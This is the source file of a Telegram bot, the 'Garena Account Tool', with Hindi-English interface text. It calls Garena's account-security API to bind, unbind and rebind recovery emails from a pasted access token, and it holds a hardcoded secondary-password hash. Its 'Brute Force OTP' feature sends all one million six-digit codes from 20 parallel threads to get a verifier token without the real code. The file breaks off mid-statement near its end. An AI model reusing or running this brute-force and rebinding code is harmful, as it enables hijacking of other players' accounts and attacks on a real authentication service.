"""Garena Account Tool - Full-featured Telegram Bot with button-driven UX."""

import asyncio
import concurrent.futures
import logging
import os
import threading
import requests

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# ─── Garena API Config ────────────────────────────────────────────────────────

GARENA_APP_ID = "100067"
GARENA_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

# ─── Conversation States ──────────────────────────────────────────────────────

(
    MAIN_MENU,
    ADD_GET_EMAIL, ADD_GET_ACCESS, ADD_GET_OTP,
    CHECK_GET_ACCESS,
    PLATFORM_GET_ACCESS,
    CANCEL_GET_ACCESS,
    UNBIND_CHOOSE_METHOD, UNBIND_GET_EMAIL, UNBIND_GET_ACCESS,
    UNBIND_GET_OTP, UNBIND_GET_PASS,
    CHANGE_CHOOSE_METHOD, CHANGE_GET_OLD_EMAIL, CHANGE_GET_ACCESS,
    CHANGE_GET_NEW_EMAIL, CHANGE_GET_OLD_OTP, CHANGE_GET_NEW_OTP,
    CHANGE_GET_PASS,
    REVOKE_GET_ACCESS,
    BF_GET_EMAIL, BF_GET_ACCESS,
) = range(22)

# ─── Garena API Helpers ───────────────────────────────────────────────────────

def _post(url: str, data: dict) -> dict:
    r = requests.post(url, headers=GARENA_HEADERS, data=data, timeout=30)
    r.raise_for_status()
    return r.json()

def _get(url: str, params: dict) -> dict:
    r = requests.get(url, headers=GARENA_HEADERS, params=params, timeout=30)
    r.raise_for_status()
    return r.json()

def api_send_otp(email: str, access: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:send_otp",
        {"email": email, "locale": "en_MA", "region": "IND",
         "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_verify_otp(email: str, access: str, otp: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_otp",
        {"email": email, "app_id": GARENA_APP_ID,
         "access_token": access, "otp": otp},
    )

def api_verify_identity_otp(email: str, access: str, otp: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
        {"email": email, "otp": otp,
         "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_verify_identity_password(email: str, access: str, secondary_password: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
        {"email": email, "secondary_password": secondary_password,
         "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_cancel_request(access: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:cancel_request",
        {"app_id": GARENA_APP_ID, "access_token": access},
    )

def api_create_bind_request(access: str, verifier_token: str, email: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_bind_request",
        {
            "app_id": GARENA_APP_ID, "access_token": access,
            "verifier_token": verifier_token,
            "secondary_password": "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
            "email": email,
        },
    )

def api_get_bind_info(access: str) -> dict:
    return _get(
        "https://100067.connect.garena.com/game/account_security/bind:get_bind_info",
        {"app_id": GARENA_APP_ID, "access_token": access},
    )

def api_get_platforms(access: str) -> dict:
    return _get(
        "https://100067.connect.garena.com/bind/app/platform/info/get",
        {"access_token": access},
    )

def api_create_unbind_request(access: str, identity_token: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
        {"app_id": GARENA_APP_ID, "access_token": access,
         "identity_token": identity_token},
    )

def api_create_rebind_request(access: str, identity_token: str,
                               verifier_token: str, new_email: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
        {
            "identity_token": identity_token, "email": new_email,
            "app_id": GARENA_APP_ID, "verifier_token": verifier_token,
            "access_token": access,
        },
    )

def api_revoke_token(access: str) -> str:
    r = requests.get(
        f"https://100067.connect.garena.com/oauth/logout?access_token={access}",
        timeout=30,
    )
    return r.text.strip()

def convert_time(seconds: int) -> str:
    d, rem = divmod(int(seconds), 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    return f"{d}d {h}h {m}m {s}s"

# ─── Keyboards ────────────────────────────────────────────────────────────────

def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📧 Add Recovery Email",     callback_data="add_email"),
         InlineKeyboardButton("🔍 Check Recovery Email",   callback_data="check_email")],
        [InlineKeyboardButton("🔗 Check Platform",         callback_data="check_platform"),
         InlineKeyboardButton("❌ Cancel Recovery Email",  callback_data="cancel_email")],
        [InlineKeyboardButton("🔓 Unbind Email",           callback_data="unbind_email"),
         InlineKeyboardButton("🔄 Change Bind Email",      callback_data="change_bind")],
        [InlineKeyboardButton("🚫 Revoke Token",           callback_data="revoke_token"),
         InlineKeyboardButton("🔨 Brute Force OTP",        callback_data="brute_force")],
    ])

def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_main")]
    ])

def method_keyboard(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📨 Email OTP se",          callback_data=f"{prefix}_otp")],
        [InlineKeyboardButton("🔐 Secondary Password se", callback_data=f"{prefix}_pass")],
        [InlineKeyboardButton("🏠 Main Menu",             callback_data="back_main")],
    ])

# ─── Shared Helpers ───────────────────────────────────────────────────────────

MENU_TEXT = (
    "🎮 *Garena Account Tool*\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "👇 Feature select karo aur click karo:"
)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    if update.message:
        await update.message.reply_text(
            MENU_TEXT, parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
    elif update.callback_query:
        await update.callback_query.answer()
        try:
            await update.callback_query.edit_message_text(
                MENU_TEXT, parse_mode="Markdown",
                reply_markup=main_menu_keyboard()
            )
        except Exception:
            await update.callback_query.message.reply_text(
                MENU_TEXT, parse_mode="Markdown",
                reply_markup=main_menu_keyboard()
            )
    return MAIN_MENU


async def cancel_op(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    await update.message.reply_text(
        "❌ Cancel ho gaya.", reply_markup=back_keyboard()
    )
    return ConversationHandler.END


async def _done(update: Update, text: str) -> None:
    """Send a message with a 🏠 Main Menu button attached."""
    await update.message.reply_text(
        text, parse_mode="Markdown", reply_markup=back_keyboard()
    )


async def _err(update: Update, text: str) -> None:
    """Send an error message with a 🏠 Main Menu button."""
    await update.message.reply_text(
        f"❌ {text}", parse_mode="Markdown", reply_markup=back_keyboard()
    )

# ─── Feature 1: Add Recovery Email ───────────────────────────────────────────

async def add_email_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "📧 *Add Recovery Email*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 *Step 1/3* — Apna email address type karo:",
        parse_mode="Markdown",
    )
    return ADD_GET_EMAIL


async def add_get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["email"] = update.message.text.strip()
    await update.message.reply_text(
        "📝 *Step 2/3* — Apna Access Token type karo:", parse_mode="Markdown"
    )
    return ADD_GET_ACCESS


async def add_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    access = update.message.text.strip()
    email = context.user_data["email"]
    context.user_data["access"] = access
    await update.message.reply_text("⏳ OTP bhej raha hoon...")
    try:
        res = api_send_otp(email, access)
        if res.get("result") == 0:
            await update.message.reply_text(
                f"✅ OTP `{email}` pe bhej diya!\n\n"
                "📝 *Step 3/3* — OTP enter karo:",
                parse_mode="Markdown",
            )
            return ADD_GET_OTP
        else:
            await _err(update, f"OTP send fail:\n`{res}`")
            return ConversationHandler.END
    except Exception as e:
        await _err(update, f"Error: `{e}`")
        return ConversationHandler.END


async def add_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp = update.message.text.strip()
    email, access = context.user_data["email"], context.user_data["access"]
    await update.message.reply_text("⏳ OTP verify kar raha hoon...")
    try:
        res = api_verify_otp(email, access, otp)
        verifier_token = res.get("verifier_token")
        if not verifier_token:
            await _err(update, f"OTP verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Email bind kar raha hoon...")
        api_cancel_request(access)
        bind_res = api_create_bind_request(access, verifier_token, email)
        if bind_res.get("result") == 0:
            await _done(update, f"✅ *SUCCESS!*\n`{email}` successfully add ho gaya!")
        else:
            await _err(update, f"Bind fail:\n`{bind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Feature 2: Check Recovery Email ─────────────────────────────────────────

async def check_email_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "🔍 *Check Recovery Email*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 Access Token type karo:",
        parse_mode="Markdown",
    )
    return CHECK_GET_ACCESS


async def check_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    access = update.message.text.strip()
    await update.message.reply_text("⏳ Info fetch kar raha hoon...")
    try:
        data = api_get_bind_info(access)
        email = data.get("email", "")
        email_pending = data.get("email_to_be", "")
        countdown = data.get("request_exec_countdown", 0)
        if email == "" and email_pending:
            msg = (
                f"📧 *Pending Email:* `{email_pending}`\n"
                f"⏰ *Confirm Hoga:* {convert_time(countdown)}"
            )
        elif email and email_pending == "":
            msg = f"📧 *Linked Email:* `{email}`\n✅ *Status:* Confirmed!"
        else:
            msg = "❌ Koi email linked nahi hai!"
        await _done(update, msg)
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Feature 3: Check Platform ───────────────────────────────────────────────

async def platform_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "🔗 *Check Platform*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 Access Token type karo:",
        parse_mode="Markdown",
    )
    return PLATFORM_GET_ACCESS


async def platform_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    access = update.message.text.strip()
    await update.message.reply_text("⏳ Platform info fetch kar raha hoon...")
    try:
        j = api_get_platforms(access)
        platform_map = {
            3: "Facebook", 5: "VK", 7: "Huawei",
            8: "Gmail", 10: "iCloud", 11: "Twitter",
        }
        bounded = j.get("bounded_accounts", [])
        available = j.get("available_platforms", [])
        lines = ["🔗 *Secondary Links:*"]
        found = False
        for x in bounded:
            p = x.get("platform")
            uinfo = x.get("user_info", {})
            e = uinfo.get("email", "")
            n = uinfo.get("nickname", "")
            if p in platform_map:
                lines.append(f"\n*{platform_map[p]}*")
                if e: lines.append(f"  📧 `{e}`")
                if n: lines.append(f"  👤 `{n}`")
                found = True
        if not found:
            lines.append("  _Koi secondary link nahi mila_")
        for k, name in platform_map.items():
            if k not in available:
                lines.append(f"\n🎮 *Main Platform:* {name}")
                break
        await _done(update, "\n".join(lines))
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Feature 4: Cancel Recovery Email ────────────────────────────────────────

async def cancel_email_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "❌ *Cancel Recovery Email*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 Access Token type karo:",
        parse_mode="Markdown",
    )
    return CANCEL_GET_ACCESS


async def cancel_email_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    access = update.message.text.strip()
    await update.message.reply_text("⏳ Cancel kar raha hoon...")
    try:
        res = api_cancel_request(access)
        if res.get("result") == 0:
            await _done(update, "✅ Recovery email request cancel ho gaya!")
        else:
            await _err(update, f"Cancel fail:\n`{res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Feature 5: Unbind Email ─────────────────────────────────────────────────

async def unbind_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "🔓 *Unbind Email*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👇 Verify karne ka method choose karo:",
        parse_mode="Markdown",
        reply_markup=method_keyboard("unbind"),
    )
    return UNBIND_CHOOSE_METHOD


async def unbind_choose_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data
    if data == "back_main":
        return await show_main_menu(update, context)
    context.user_data["unbind_method"] = data
    await update.callback_query.edit_message_text(
        "🔓 *Unbind Email*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 Linked email address type karo:",
        parse_mode="Markdown",
    )
    return UNBIND_GET_EMAIL


async def unbind_get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["email"] = update.message.text.strip()
    await update.message.reply_text("📝 Access Token type karo:")
    return UNBIND_GET_ACCESS


async def unbind_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    access = update.message.text.strip()
    context.user_data["access"] = access
    method = context.user_data.get("unbind_method")
    if method == "unbind_otp":
        email = context.user_data["email"]
        await update.message.reply_text("⏳ OTP bhej raha hoon...")
        try:
            res = api_send_otp(email, access)
            if res.get("result") == 0:
                await update.message.reply_text(
                    f"✅ OTP `{email}` pe bhej diya!\n\n📝 OTP enter karo:",
                    parse_mode="Markdown",
                )
                return UNBIND_GET_OTP
            else:
                await _err(update, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, f"Error: `{e}`")
            return ConversationHandler.END
    else:
        await update.message.reply_text("📝 Secondary Password type karo:")
        return UNBIND_GET_PASS


async def unbind_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp = update.message.text.strip()
    email, access = context.user_data["email"], context.user_data["access"]
    await update.message.reply_text("⏳ Identity verify kar raha hoon...")
    try:
        res = api_verify_identity_otp(email, access, otp)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
        unbind_res = api_create_unbind_request(access, identity_token)
        if unbind_res.get("result") == 0:
            await _done(update, "✅ *SUCCESS!* Email unbind request create ho gaya!")
        else:
            await _err(update, f"Unbind fail:\n`{unbind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END


async def unbind_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    secondary_password = update.message.text.strip()
    email, access = context.user_data["email"], context.user_data["access"]
    await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
    try:
        res = api_verify_identity_password(email, access, secondary_password)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
        unbind_res = api_create_unbind_request(access, identity_token)
        if unbind_res.get("result") == 0:
            await _done(update, "✅ *SUCCESS!* Email unbind request create ho gaya!")
        else:
            await _err(update, f"Unbind fail:\n`{unbind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Feature 6: Change Bind Email ────────────────────────────────────────────

async def change_bind_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "🔄 *Change Bind Email*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👇 Purani email verify karne ka method choose karo:",
        parse_mode="Markdown",
        reply_markup=method_keyboard("change"),
    )
    return CHANGE_CHOOSE_METHOD


async def change_choose_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data
    if data == "back_main":
        return await show_main_menu(update, context)
    context.user_data["change_method"] = data
    await update.callback_query.edit_message_text(
        "🔄 *Change Bind Email*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 Purani (old) email address type karo:",
        parse_mode="Markdown",
    )
    return CHANGE_GET_OLD_EMAIL


async def change_get_old_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["old_email"] = update.message.text.strip()
    await update.message.reply_text("📝 Access Token type karo:")
    return CHANGE_GET_ACCESS


async def change_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["access"] = update.message.text.strip()
    await update.message.reply_text("📝 Nayi (new) email address type karo:")
    return CHANGE_GET_NEW_EMAIL


async def change_get_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["new_email"] = update.message.text.strip()
    method = context.user_data.get("change_method")
    old_email, access = context.user_data["old_email"], context.user_data["access"]
    if method == "change_otp":
        await update.message.reply_text(
            f"⏳ OTP `{old_email}` pe bhej raha hoon...", parse_mode="Markdown"
        )
        try:
            res = api_send_otp(old_email, access)
            if res.get("result") == 0:
                await update.message.reply_text(
                    "✅ OTP bhej diya!\n\n📝 Purani email ka OTP enter karo:"
                )
                return CHANGE_GET_OLD_OTP
            else:
                await _err(update, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, f"Error: `{e}`")
            return ConversationHandler.END
    else:
        await update.message.reply_text("📝 Secondary Password type karo:")
        return CHANGE_GET_PASS


async def change_get_old_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp = update.message.text.strip()
    old_email, access = context.user_data["old_email"], context.user_data["access"]
    new_email = context.user_data["new_email"]
    await update.message.reply_text("⏳ Identity verify kar raha hoon...")
    try:
        res = api_verify_identity_otp(old_email, access, otp)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        context.user_data["identity_token"] = identity_token
        await update.message.reply_text(
            f"⏳ OTP `{new_email}` pe bhej raha hoon...", parse_mode="Markdown"
        )
        res2 = api_send_otp(new_email, access)
        if res2.get("result") == 0:
            await update.message.reply_text(
                "✅ OTP bhej diya!\n\n📝 Nayi email ka OTP enter karo:"
            )
            return CHANGE_GET_NEW_OTP
        else:
            await _err(update, f"OTP send fail:\n`{res2}`")
            return ConversationHandler.END
    except Exception as e:
        await _err(update, f"Error: `{e}`")
        return ConversationHandler.END


async def change_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    secondary_password = update.message.text.strip()
    old_email, access = context.user_data["old_email"], context.user_data["access"]
    new_email = context.user_data["new_email"]
    await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
    try:
        res = api_verify_identity_password(old_email, access, secondary_password)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        context.user_data["identity_token"] = identity_token
        await update.message.reply_text(
            f"⏳ OTP `{new_email}` pe bhej raha hoon...", parse_mode="Markdown"
        )
        res2 = api_send_otp(new_email, access)
        if res2.get("result") == 0:
            await update.message.reply_text(
                "✅ OTP bhej diya!\n\n📝 Nayi email ka OTP enter karo:"
            )
            return CHANGE_GET_NEW_OTP
        else:
            await _err(update, f"OTP send fail:\n`{res2}`")
            return ConversationHandler.END
    except Exception as e:
        await _err(update, f"Error: `{e}`")
        return ConversationHandler.END


async def change_get_new_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp = update.message.text.strip()
    new_email, access = context.user_data["new_email"], context.user_data["access"]
    identity_token = context.user_data["identity_token"]
    await update.message.reply_text("⏳ Nayi email verify kar raha hoon...")
    try:
        res = api_verify_otp(new_email, access, otp)
        verifier_token = res.get("verifier_token")
        if not verifier_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Rebind request create kar raha hoon...")
        rebind_res = api_create_rebind_request(
            access, identity_token, verifier_token, new_email
        )
        if rebind_res.get("result") == 0:
            await _done(update, f"✅ *SUCCESS!* Email `{new_email}` pe change ho gaya!")
        else:
            await _err(update, f"Rebind fail:\n`{rebind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Feature 7: Revoke Access Token ──────────────────────────────────────────

async def revoke_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "🚫 *Revoke Access Token*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ Token revoke hone ke baad kaam nahi karega!\n\n"
        "📝 Access Token type karo:",
        parse_mode="Markdown",
    )
    return REVOKE_GET_ACCESS


async def revoke_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    access = update.message.text.strip()
    await update.message.reply_text("⏳ Token revoke kar raha hoon...")
    try:
        response = api_revoke_token(access)
        if response == '{"result":0}':
            await _done(update, "✅ *Token successfully revoke ho gaya!* 🎉")
        else:
            await _err(update, f"Revoke fail:\n`{response}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Feature 8: Brute Force OTP ──────────────────────────────────────────────

async def run_brute_force(chat_id: int, email: str, access: str, bot) -> None:
    """
    20 parallel threads mein 000000-999999 try karo.
    Jab sahi code mile — sirf EK message bhejo, baaki sab band.
    """
    found_event = threading.Event()
    result_holder: list[dict] = []

    def try_codes(start: int, end: int) -> None:
        url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        for code in range(start, end):
            if found_event.is_set():
                return
            code_str = f"{code:06d}"
            data = {
                "email": email, "app_id": GARENA_APP_ID,
                "access_token": access, "otp": code_str,
            }
            try:
                resp = requests.post(url, headers=GARENA_HEADERS, data=data, timeout=15)
                result = resp.json()
                if result.get("result") == 0:
                    found_event.set()
                    result_holder.append({
                        "code": code_str,
                        "verifier_token": result.get("verifier_token", ""),
                    })
                    return
            except Exception:
                if found_event.is_set():
                    return
                continue

    NUM_THREADS = 20
    TOTAL = 1_000_000
    chunk = TOTAL // NUM_THREADS

    loop = asyncio.get_event_loop()

    def run_pool() -> None:
        with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
            futures = [
                ex.submit(try_codes, i * chunk,
                          (i + 1) * chunk if i < NUM_THREADS - 1 else TOTAL)
                for i in range(NUM_THREADS)
            ]
            concurrent.futures.wait(futures)

    await loop.run_in_executor(None, run_pool)

    if result_holder:
        r = result_holder[0]
        await bot.send_message(
            chat_id=chat_id,
            text=(
                "🎯 *Brute Force — CODE MIL GAYA!*\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔑 OTP Code: `{r['code']}`\n"
                f"🎫 Verifier Token: `{r['verifier_token']}`"
            ),
            parse_mode="Markdown",
            reply_markup=back_keyboard(),
        )
    else:
        await bot.send_message(
            chat_id=chat_id,
            text="❌ Brute force complete — sahi code nahi mila.\n(000000–999999 sab try ho gaye)",
            reply_markup=back_keyboard(),
        )


async def bf_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "🔨 *Brute Force OTP*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Background mein chalega — jab sahi code mile tabhi\n"
        "sirf *ek baar* message aayega. ⚡\n\n"
        "📝 *Step 1/2* — Email address type karo:",
        parse_mode="Markdown",
    )
    return BF_GET_EMAIL


async def bf_get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["bf_email"] = update.message.text.strip()
    await update.message.reply_text("📝 *Step 2/2* — Access Token type karo:", parse_mode="Markdown")
    return BF_GET_ACCESS


async def bf_get_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    access = update.message.text.strip()
    email = context.user_data["bf_email"]
    chat_id = update.effective_chat.id
    await update.message.reply_text("⏳ OTP bhej raha hoon...")
    try:
        res = api_send_otp(email, access)
        if res.get("result") != 0:
            await _err(update, f"OTP send fail:\n`{res}`")
            return ConversationHandler.END
    except Exception as e:
        await _err(update, f"Error: `{e}`")
        return ConversationHandler.END

    await update.message.reply_text(
        "✅ OTP bhej diya!\n\n"
        "🔨 *Brute Force background mein shuru ho gaya!*\n"
        "Jab sahi code mile — sirf tab ek message aayega.\n"
        "Baaki sab attempts automatic band ho jayenge. ⏳",
        parse_mode="Markdown",
        reply_markup=back_keyboard(),
    )

    context.application.create_task(
        run_brute_force(chat_id, email, access, context.application.bot)
    )
    return ConversationHandler.END

# ─── Utility Commands ─────────────────────────────────────────────────────────

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "📋 *Commands:*\n"
        "/start — Main menu (saare buttons)\n"
        "/cancel — Koi bhi operation cancel karo\n"
        "/ping — Bot status check\n\n"
        "Sab kuch buttons se hota hai — sirf inputs type karne padte hain.",
        parse_mode="Markdown",
        reply_markup=back_keyboard(),
    )


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🟢 Bot online hai!", reply_markup=back_keyboard())

# ─── App Entry Point ──────────────────────────────────────────────────────────

def main() -> None:
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not token:
        raise RuntimeError("TELEGRAM_BOT_TOKEN is not set.")

    app = Application.builder().token(token).build()

    # All feature entry points (including back_main for post-flow menu button)
    entry_points = [
        CommandHandler("start", show_main_menu),
        CallbackQueryHandler(show_main_menu,      pattern="^back_main$"),
        CallbackQueryHandler(add_email_start,     pattern="^add_email$"),
        CallbackQueryHandler(check_email_start,   pattern="^check_email$"),
        CallbackQueryHandler(platform_start,      pattern="^check_platform$"),
        CallbackQueryHandler(cancel_email_start,  pattern="^cancel_email$"),
        CallbackQueryHandler(unbind_start,        pattern="^unbind_email$"),
        CallbackQueryHandler(change_bind_start,   pattern="^change_bind$"),
        CallbackQueryHandler(revoke_start,        pattern="^revoke_token$"),
        CallbackQueryHandler(bf_start,            pattern="^brute_force$"),
    ]

    conv = ConversationHandler(
        entry_points=entry_points,
        states={
            MAIN_MENU: [
                CallbackQueryHandler(add_email_start,    pattern="^add_email$"),
                CallbackQueryHandler(check_email_start,  pattern="^check_email$"),
                CallbackQueryHandler(platform_start,     pattern="^check_platform$"),
                CallbackQueryHandler(cancel_email_start, pattern="^cancel_email$"),
                CallbackQueryHandler(unbind_start,       pattern="^unbind_email$"),
                CallbackQueryHandler(change_bind_start,  pattern="^change_bind$"),
                CallbackQueryHandler(revoke_start,       pattern="^revoke_token$"),
                CallbackQueryHandler(bf_start,           pattern="^brute_force$"),
            ],
            # Add Email
            ADD_GET_EMAIL:   [MessageHandler(filters.TEXT & ~filters.COMMAND, add_get_email)],
            ADD_GET_ACCESS:  [MessageHandler(filters.TEXT & ~filters.COMMAND, add_get_access)],
            ADD_GET_OTP:     [MessageHandler(filters.TEXT & ~filters.COMMAND, add_get_otp)],
            # Check Email
            CHECK_GET_ACCESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_get_access)],
            # Check Platform
            PLATFORM_GET_ACCESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, platform_get_access)],
            # Cancel Email
            CANCEL_GET_ACCESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_email_get_access)],
            # Unbind Email
            UNBIND_CHOOSE_METHOD: [CallbackQueryHandler(unbind_choose_method)],
            UNBIND_GET_EMAIL:     [MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_get_email)],
            UNBIND_GET_ACCESS:    [MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_get_access)],
            UNBIND_GET_OTP:       [MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_get_otp)],
            UNBIND_GET_PASS:      [MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_get_pass)],
            # Change Bind Email
            CHANGE_CHOOSE_METHOD: [CallbackQueryHandler(change_choose_method)],
            CHANGE_GET_OLD_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_get_old_email)],
            CHANGE_GET_ACCESS:    [MessageHandler(filters.TEXT & ~filters.COMMAND, change_get_access)],
            CHANGE_GET_NEW_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_get_new_email)],
            CHANGE_GET_OLD_OTP:   [MessageHandler(filters.TEXT & ~filters.COMMAND, change_get_old_otp)],
            CHANGE_GET_NEW_OTP:   [MessageHandler(filters.TEXT & ~filters.COMMAND, change_get_new_otp)],
            CHANGE_GET_PASS:      [MessageHandler(filters.TEXT & ~filters.COMMAND, change_get_pass)],
            # Revoke Token
            REVOKE_GET_ACCESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_get_access)],
            # Brute Force
            BF_GET_EMAIL:  [MessageHandler(filters.TEXT & ~filters.COMMAND, bf_get_email)],
            BF_GET_ACCESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, bf_get_access)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_op),
            CommandHandler("start", show_main_menu),
        ],
        allow_reentry=True,
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("ping", ping))

    base_url = os.environ.get("WEBHOOK_BASE_URL")
    webhook_secret = os.environ.get("WEBHOOK_SECRET")

    if base_url and webhook_secret:
